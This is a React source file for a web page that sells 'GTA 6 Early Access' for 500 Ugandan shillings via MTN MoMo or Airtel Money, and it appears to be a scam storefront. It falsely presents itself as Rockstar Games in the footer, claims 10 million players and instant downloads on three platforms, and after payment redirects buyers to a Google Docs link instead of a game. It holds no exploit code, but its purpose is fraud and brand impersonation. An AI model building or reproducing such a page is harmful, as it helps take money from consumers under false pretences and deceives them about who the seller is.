/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Box, 
  Gamepad2, 
  Globe, 
  Sword, 
  Download, 
  CheckCircle,
  Menu,
  X,
  CreditCard,
  ChevronRight,
  Smartphone
} from 'lucide-react';

export default function App() {
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [isCheckoutModalOpen, setIsCheckoutModalOpen] = useState(false);
  const [mobileProvider, setMobileProvider] = useState<'mtn' | 'airtel'>('mtn');
  const [email, setEmail] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [paymentState, setPaymentState] = useState<'idle' | 'processing' | 'waiting' | 'success'>('idle');
  const [paymentError, setPaymentError] = useState<string | null>(null);

  const toggleMobileMenu = () => setIsMobileMenuOpen(!isMobileMenuOpen);
  const openCheckout = () => {
    setIsCheckoutModalOpen(true);
    setPaymentState('idle');
    setPaymentError(null);
  };
  const closeCheckout = () => setIsCheckoutModalOpen(false);

  const pollPayment = async (reference: string) => {
    let attempts = 0;
    const maxAttempts = 40; // 2 minutes maximum
    
    const check = async () => {
      if (attempts >= maxAttempts) {
        setPaymentState('idle');
        setPaymentError("Payment timed out waiting for confirmation. Please try again.");
        return;
      }
      
      try {
        const res = await fetch(`/api/payment-status/${reference}`);
        const data = await res.json();
        
        if (data.status === 'success') {
          setPaymentState('success');
          setTimeout(() => {
            window.location.href = "https://docs.google.com/document/d/1pRhLp4aXtshvA3fhCSstt-UFgVptP2-ptoKR0WCo4YQ/edit?usp=sharing";
          }, 2500);
          return; // stop polling
        } else if (data.status === 'failed') {
          setPaymentState('idle');
          setPaymentError("Payment failed or was cancelled by user.");
          return;
        }
      } catch(e) {
        console.error("Polling error", e);
      }
      
      attempts++;
      setTimeout(check, 3000);
    };
    
    check();
  };

  const handlePayment = async () => {
    if (!email || !phoneNumber) {
      setPaymentError("Please enter your email and mobile number.");
      return;
    }
    setPaymentError(null);
    setPaymentState('processing');

    try {
      const res = await fetch("/api/collect-money", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          phoneNumber,
          provider: mobileProvider,
          amount: 500,
          email
        })
      });

      if (!res.ok) {
        const errorData = await res.json();
        throw new Error(errorData.error || errorData.message || "Payment request failed");
      }

      const data = await res.json();
      const reference = data.reference;
      
      if (reference) {
        setPaymentState('waiting');
        pollPayment(reference);
      } else {
        throw new Error("Invalid response from server: Missing reference");
      }
    } catch (err: any) {
      setPaymentError(err.message || "An unexpected error occurred");
      setPaymentState('idle');
    }
  };

  return (
    <div className="min-h-screen relative selection:bg-brand-500 selection:text-white">
      {/* Navigation */}
      <nav className="fixed top-0 inset-x-0 z-50 bg-obsidian-900/80 backdrop-blur-md border-b border-white/5">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-20">
            {/* Logo */}
            <div className="flex items-center gap-2 cursor-pointer group">
              <Box className="w-8 h-8 text-brand-500 group-hover:rotate-12 transition-transform duration-300" />
              <span className="font-display font-bold text-2xl tracking-tight text-white uppercase italic">
                GTA 6 <span className="text-brand-500">Early Access</span>
              </span>
            </div>

            {/* Desktop Menu */}
            <div className="hidden md:flex items-center gap-8">
              <a href="#features" className="text-sm font-medium text-gray-300 hover:text-white transition-colors">Features</a>
              <a href="#community" className="text-sm font-medium text-gray-300 hover:text-white transition-colors">Community</a>
              <a href="#support" className="text-sm font-medium text-gray-300 hover:text-white transition-colors">Support</a>
              <button 
                onClick={openCheckout}
                className="bg-brand-500 hover:bg-brand-600 px-6 py-2.5 rounded-full font-semibold text-sm transition-all shadow-[0_0_20px_rgba(34,197,94,0.3)] hover:shadow-[0_0_30px_rgba(34,197,94,0.5)] active:scale-95"
              >
                Buy Now — 500 UGX
              </button>
            </div>

            {/* Mobile Menu Button */}
            <div className="md:hidden">
              <button onClick={toggleMobileMenu} className="p-2 text-gray-300 hover:text-white">
                {isMobileMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
              </button>
            </div>
          </div>
        </div>

        {/* Mobile menu */}
        <AnimatePresence>
          {isMobileMenuOpen && (
            <motion.div 
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              className="md:hidden bg-obsidian-800 border-b border-white/5 overflow-hidden"
            >
              <div className="px-4 py-6 flex flex-col gap-4">
                <a href="#features" onClick={toggleMobileMenu} className="font-medium text-gray-300 hover:text-brand-500 transition-colors">Features</a>
                <a href="#community" onClick={toggleMobileMenu} className="font-medium text-gray-300 hover:text-brand-500 transition-colors">Community</a>
                <a href="#support" onClick={toggleMobileMenu} className="font-medium text-gray-300 hover:text-brand-500 transition-colors">Support</a>
                <button 
                  onClick={() => { toggleMobileMenu(); openCheckout(); }}
                  className="bg-brand-500 hover:bg-brand-600 px-6 py-3 rounded-xl font-semibold w-full flex items-center justify-center mt-2 shadow-[0_0_20px_rgba(34,197,94,0.2)]"
                >
                  Buy Now — 500 UGX
                </button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </nav>

      {/* Hero Section */}
      <section className="relative pt-32 pb-20 lg:pt-48 lg:pb-32 overflow-hidden">
        {/* Background Image & Overlay */}
        <div className="absolute inset-0 z-0">
          <img 
            src="https://images.unsplash.com/photo-1533221971701-d77519ffca2a?q=80&w=2000&auto=format&fit=crop" 
            alt="Neon sunset landscape" 
            className="w-full h-full object-cover object-center opacity-50"
          />
          <div className="absolute inset-0 bg-gradient-to-b from-obsidian-900/40 via-obsidian-900/80 to-obsidian-900"></div>
          <div className="absolute inset-0 bg-gradient-to-r from-brand-500/10 via-transparent to-cyan/10 pointer-events-none"></div>
        </div>

        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
          <div className="text-center max-w-4xl mx-auto">
            <motion.div
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.7, ease: "easeOut" }}
            >
              <h1 className="text-5xl md:text-7xl lg:text-8xl font-black text-transparent bg-clip-text bg-gradient-to-b from-white to-gray-400 tracking-tight leading-[1.1] mb-6 drop-shadow-2xl italic uppercase">
                Welcome to <br />
                <span className="text-brand-500 bg-none bg-clip-border drop-shadow-[0_0_30px_rgba(255,0,127,0.4)] text-cyan">Neon Nights</span>
              </h1>
              <p className="text-xl md:text-2xl text-gray-400 mb-10 max-w-2xl mx-auto font-medium leading-relaxed">
                Cruise the streets, pull off heists, and build your empire in the most vibrant open world.
              </p>
              
              <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
                <button 
                  onClick={openCheckout}
                  className="group flex items-center gap-3 bg-brand-500 hover:bg-brand-600 text-white px-8 py-4 rounded-full font-bold text-lg transition-all w-full sm:w-auto justify-center shadow-[0_0_30px_rgba(34,197,94,0.4)] hover:shadow-[0_0_50px_rgba(34,197,94,0.6)] hover:scale-105 active:scale-95"
                >
                  <Download className="w-6 h-6" />
                  <span>Get Instant Access</span>
                  <ChevronRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                </button>
                <div className="text-sm font-medium text-gray-500 flex items-center gap-2">
                  <CheckCircle className="w-4 h-4 text-brand-500" />
                  <span>One-time purchase of 500 UGX</span>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </section>

      {/* Trust & Platforms */}
      <section className="py-10 border-y border-white/5 bg-white/5 backdrop-blur-sm relative z-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <p className="text-center text-sm font-semibold tracking-widest text-gray-500 uppercase mb-6">
            Join over 10 Million players worldwide
          </p>
          <div className="flex justify-center items-center gap-x-12 sm:gap-x-24 opacity-60 grayscale flex-wrap gap-y-6">
            {['Windows', 'macOS', 'Linux'].map((os) => (
              <div key={os} className="flex items-center gap-2 font-display text-xl font-bold text-gray-300 hover:grayscale-0 hover:text-white transition-all cursor-default">
                {os === 'Windows' && <div className="w-6 h-6 bg-blue-500 rounded-sm" />}
                {os === 'macOS' && <div className="w-6 h-6 rounded-full bg-gray-400" />}
                {os === 'Linux' && <div className="w-6 h-6 bg-yellow-500 rounded-sm rotate-45" />}
                {os}
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Features Grid */}
      <section id="features" className="py-24 relative z-10 bg-obsidian-800">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="mb-16">
            <h2 className="text-4xl md:text-5xl font-black mb-6 uppercase italic">Rule the <span className="text-brand-500">Streets</span>.</h2>
            <p className="text-gray-400 text-lg max-w-2xl">From fast cars to high-stakes deals, experience a living, breathing metropolis that reacts to your every move.</p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <FeatureCard 
              icon={<Sword className="w-8 h-8 text-red-500" />}
              title="Organized Crime"
              description="Rise through the ranks by planning epic heists and taking down rival syndicates in intense gang warfare."
              image="https://images.unsplash.com/photo-1542451313-0cebc71c4ac3?q=80&w=600&auto=format&fit=crop"
            />
            <FeatureCard 
              icon={<Gamepad2 className="w-8 h-8 text-cyan" />}
              title="Exotic Rides"
              description="Customize heavily modified supercars and race through the glaring neon streets at blistering speeds."
              image="https://images.unsplash.com/photo-1621360841013-c7683cfa86c5?q=80&w=600&auto=format&fit=crop"
            />
            <FeatureCard 
              icon={<Globe className="w-8 h-8 text-brand-500" />}
              title="Endless Multiplayer"
              description="Form crews with friends online, buy penthouses, and rule the criminal underworld together."
              image="https://images.unsplash.com/photo-1563854350130-18e0a84eef26?q=80&w=600&auto=format&fit=crop"
            />
          </div>
        </div>
      </section>

      {/* Final CTA */}
      <section className="py-32 relative overflow-hidden flex items-center justify-center">
        <div className="absolute inset-0 shadow-[inset_0_0_100px_rgba(10,10,15,1)] z-10 pointer-events-none" />
        <div className="absolute inset-0 bg-brand-500 blur-[150px] opacity-20" />
        <div className="max-w-4xl mx-auto px-4 relative z-20 text-center">
          <Box className="w-16 h-16 text-brand-500 mx-auto mb-8 animate-pulse" />
          <h2 className="text-4xl md:text-6xl font-black mb-8 italic uppercase">Ready to take over?</h2>
          <button 
            onClick={openCheckout}
            className="group flex items-center gap-3 bg-white text-obsidian-900 hover:bg-gray-100 px-10 py-5 rounded-full font-bold text-xl transition-all mx-auto shadow-2xl hover:scale-105 active:scale-95"
          >
            <Smartphone className="w-6 h-6" />
            <span>Pay Now — Instant Download</span>
          </button>
          <p className="mt-6 text-gray-400 font-medium">Available immediately for Windows, macOS, and Linux.</p>
        </div>
      </section>

      {/* Footer */}
      <footer className="py-12 border-t border-white/10 bg-obsidian-900 relative z-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col md:flex-row justify-between items-center gap-6">
          <div className="flex items-center gap-2">
            <Box className="w-6 h-6 text-brand-500" />
            <span className="font-display font-bold text-xl text-white uppercase italic">GTA 6 <span className="text-brand-500">Early Access</span></span>
          </div>
          <div className="flex gap-6 text-sm text-gray-500 font-medium">
            <a href="#" className="hover:text-white transition-colors">Terms of Service</a>
            <a href="#" className="hover:text-white transition-colors">Privacy Policy</a>
            <a href="#" className="hover:text-white transition-colors">EULA</a>
          </div>
          <p className="text-gray-600 text-sm">© {(new Date()).getFullYear()} Rockstar Games.</p>
        </div>
      </footer>

      {/* Checkout Modal Overlay */}
      <AnimatePresence>
        {isCheckoutModalOpen && (
          <>
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={closeCheckout}
              className="fixed inset-0 bg-obsidian-900/80 backdrop-blur-sm z-[100]"
            />
            <div className="fixed inset-0 z-[101] flex items-center justify-center p-4 pointer-events-none">
              <motion.div 
                initial={{ opacity: 0, scale: 0.95, y: 20 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.95, y: 20 }}
                className="bg-obsidian-800 border border-white/10 rounded-2xl w-full max-w-md shadow-2xl overflow-hidden pointer-events-auto"
              >
                {/* Modal Header */}
                <div className="flex justify-between items-center p-6 border-b border-white/5">
                  <div className="flex items-center gap-3">
                    <div className="p-2 bg-brand-500/20 rounded-lg">
                      <Download className="w-5 h-5 text-brand-500" />
                    </div>
                    <div>
                      <h3 className="font-display font-bold text-lg text-white uppercase italic">Get GTA 6 Early Access</h3>
                      <p className="text-sm text-gray-400">Digital Download Edition</p>
                    </div>
                  </div>
                  <button onClick={closeCheckout} className="p-2 text-gray-400 hover:text-white hover:bg-white/10 rounded-full transition-colors">
                    <X className="w-5 h-5" />
                  </button>
                </div>
                
                {/* Modal Body / Dummy Form */}
                <div className="p-6">
                  {paymentState === 'success' ? (
                    <div className="flex flex-col items-center justify-center py-8 text-center">
                      <div className="w-16 h-16 bg-brand-500/20 rounded-full flex items-center justify-center mb-4">
                        <CheckCircle className="w-8 h-8 text-brand-500" />
                      </div>
                      <h4 className="text-2xl font-bold text-white mb-2 font-display">Payment Successful!</h4>
                      <p className="text-gray-400 mb-6 font-medium">Redirecting you to your game download...</p>
                      <a 
                        href="https://docs.google.com/document/d/1pRhLp4aXtshvA3fhCSstt-UFgVptP2-ptoKR0WCo4YQ/edit?usp=sharing"
                        target="_blank"
                        rel="noreferrer"
                        className="bg-brand-500 hover:bg-brand-600 text-white font-bold py-3 px-8 rounded-xl transition-colors mb-3 w-full block"
                      >
                        Click here if not redirected
                      </a>
                    </div>
                  ) : paymentState === 'waiting' ? (
                    <div className="flex flex-col items-center justify-center py-10 text-center">
                      <div className="w-16 h-16 relative flex items-center justify-center mb-6">
                        <div className="absolute inset-0 border-4 border-brand-500/30 rounded-full"></div>
                        <div className="absolute inset-0 border-4 border-brand-500 rounded-full border-t-transparent animate-spin"></div>
                        <Smartphone className="w-6 h-6 text-brand-500 relative z-10" />
                      </div>
                      <h4 className="text-2xl font-bold text-white mb-3 font-display">Check Your Phone</h4>
                      <p className="text-gray-400 font-medium max-w-sm mb-6">
                        We've sent a payment prompt to {phoneNumber}. Please enter your PIN on your mobile device to complete the 500 UGX payment.
                      </p>
                      <p className="text-sm text-gray-500 animate-pulse">Waiting for confirmation...</p>
                    </div>
                  ) : (
                    <>
                      <div className="flex justify-between items-end mb-6">
                        <span className="text-gray-400 text-sm font-medium">Total due today</span>
                        <span className="font-display font-bold text-4xl text-white">500 UGX</span>
                      </div>

                      {paymentError && (
                        <div className="mb-4 p-3 bg-red-500/10 border border-red-500/30 rounded-lg">
                          <p className="text-red-400 text-sm font-medium text-center">{paymentError}</p>
                        </div>
                      )}

                      <div className="space-y-4">
                        <div>
                          <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Email Address</label>
                          <input 
                            type="email" 
                            placeholder="you@example.com" 
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className="w-full bg-obsidian-900 border border-white/10 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-brand-500 focus:ring-1 focus:ring-brand-500 transition-all font-medium"
                          />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Select Provider</label>
                          <div className="grid grid-cols-2 gap-3 mb-4">
                            <button 
                              type="button"
                              onClick={() => setMobileProvider('mtn')}
                              className={`flex items-center justify-center gap-2 py-3 rounded-lg border transition-all font-bold ${
                                mobileProvider === 'mtn' 
                                ? 'bg-[#ffcc00] text-black border-[#ffcc00] shadow-[0_0_15px_rgba(255,204,0,0.3)]' 
                                : 'bg-obsidian-900 border-white/10 text-gray-400 hover:border-white/20'
                              }`}
                            >
                              MTN MoMo
                            </button>
                            <button 
                              type="button"
                              onClick={() => setMobileProvider('airtel')}
                              className={`flex items-center justify-center gap-2 py-3 rounded-lg border transition-all font-bold ${
                                mobileProvider === 'airtel' 
                                ? 'bg-[#ff0000] text-white border-[#ff0000] shadow-[0_0_15px_rgba(255,0,0,0.3)]' 
                                : 'bg-obsidian-900 border-white/10 text-gray-400 hover:border-white/20'
                              }`}
                            >
                              Airtel Money
                            </button>
                          </div>
                          
                          <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Mobile Number</label>
                          <div className="relative">
                            <input 
                              type="tel" 
                              placeholder="e.g. 0772 123 456" 
                              value={phoneNumber}
                              onChange={(e) => setPhoneNumber(e.target.value)}
                              className="w-full bg-obsidian-900 border border-white/10 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-brand-500 focus:ring-1 focus:ring-brand-500 transition-all font-mono text-lg"
                            />
                          </div>
                        </div>
                      </div>

                      <button 
                        onClick={handlePayment}
                        disabled={paymentState === 'processing'}
                        className="w-full bg-brand-500 hover:bg-brand-600 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold text-lg py-4 rounded-xl mt-8 flex items-center justify-center gap-2 transition-colors group"
                      >
                        {paymentState === 'processing' ? (
                          <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        ) : (
                          <>
                            <Download className="w-5 h-5 group-hover:-translate-y-1 transition-transform" />
                            Pay 500 UGX & Download
                          </>
                        )}
                      </button>
                      <p className="text-center text-xs text-gray-500 mt-4 leading-relaxed">
                        By confirming this purchase, you agree to the <a href="#" className="text-gray-300 hover:text-white underline decoration-gray-600">Terms of Service</a>. Charges will appear as GTA6EA.
                      </p>
                    </>
                  )}
                </div>
              </motion.div>
            </div>
          </>
        )}
      </AnimatePresence>
    </div>
  );
}

function FeatureCard({ icon, title, description, image }: { icon: React.ReactNode, title: string, description: string, image: string }) {
  return (
    <div className="group bg-obsidian-900 border border-white/5 rounded-2xl overflow-hidden hover:border-brand-500/30 transition-colors flex flex-col h-full">
      <div className="h-48 overflow-hidden relative">
        <div className="absolute inset-0 bg-obsidian-900/20 group-hover:bg-transparent transition-colors z-10" />
        <img 
          src={image} 
          alt={title} 
          className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-700 ease-out" 
        />
      </div>
      <div className="p-8 flex flex-col flex-grow">
        <div className="mb-4 bg-white/5 w-14 h-14 rounded-xl flex items-center justify-center border border-white/5">
          {icon}
        </div>
        <h3 className="text-2xl font-bold font-display mb-3">{title}</h3>
        <p className="text-gray-400 font-medium leading-relaxed flex-grow">{description}</p>
      </div>
    </div>
  );
}
